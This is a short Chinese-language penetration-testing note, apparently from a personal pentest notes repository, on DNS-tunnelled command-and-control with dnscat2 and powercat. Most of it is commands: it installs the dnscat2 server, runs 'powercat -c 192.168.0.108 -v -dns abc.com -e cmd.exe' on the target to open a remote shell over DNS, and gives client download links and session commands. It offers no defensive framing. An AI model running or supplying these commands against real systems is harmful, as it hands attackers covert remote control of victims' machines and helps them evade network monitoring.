  #### Dnscat2
	安装dnscat2
	>apt-get -y install ruby-dev git make g++
	>gem install bundler
	>git clone https://github.com/iagox86/dnscat2.git
	>cd dnscat2/server
	>bundle install
	执行
	>ruby dnscat2.rb abc.com -e open --no-cache
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/195.png)
  #### Powercat
	靶机执行
	>powercat -c 192.168.0.108 -v -dns abc.com -e cmd.exe
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/196.png)

	dnscat2执行
	>session -i 1进入会话
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/197.png)
  #### Dnscat2 exe
	Linux
	https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x86.tar.bz2 https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-x64.tar.bz2
	https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip
	攻击机执行
	>ruby dnscat2.rb --dns "domain=zone.com,host=192.168.0.108" --no-cache
	靶机执行
	>dnscat2-v0.07-client-win32.exe --dns server=192.168.0.108
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/198.png)

	攻击机执行
	>session -i [ID]进入会话
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/199.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/200.png)